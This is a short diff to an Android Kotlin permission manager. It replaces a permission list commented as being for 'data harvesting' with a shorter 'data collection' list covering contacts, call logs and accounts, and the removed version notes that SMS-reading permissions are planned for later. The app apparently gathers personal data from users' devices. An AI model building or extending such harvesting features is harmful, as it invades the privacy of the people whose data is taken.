@@ -35,34 +35,13 @@ class PermissionManager(
             Manifest.permission.FOREGROUND_SERVICE
         )
         
-        // Essential permissions for data harvesting (reduced list)
-        val OPTIONAL_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            // Android 13+ (API 33+) - Use new media permissions
-            listOf(
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.READ_CALL_LOG,
-                // TODO: SMS PERMISSIONS COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
-                // Manifest.permission.READ_SMS,
-                // Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.GET_ACCOUNTS,
-                Manifest.permission.POST_NOTIFICATIONS,
-                Manifest.permission.READ_MEDIA_IMAGES
-            )
-        } else {
-            // Android 12 and below - Use old storage permissions
-            listOf(
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.READ_CALL_LOG,
-                // TODO: SMS PERMISSIONS COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
-                // Manifest.permission.READ_SMS,
-                // Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_EXTERNAL_STORAGE,
-                Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                Manifest.permission.GET_ACCOUNTS
-            )
-        }
+        // Essential permissions for data collection (only required permissions)
+        val OPTIONAL_PERMISSIONS = listOf(
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.GET_ACCOUNTS,
+            Manifest.permission.POST_NOTIFICATIONS
+        )
         
         // System permissions that require settings access
         val SYSTEM_PERMISSIONS = listOf(
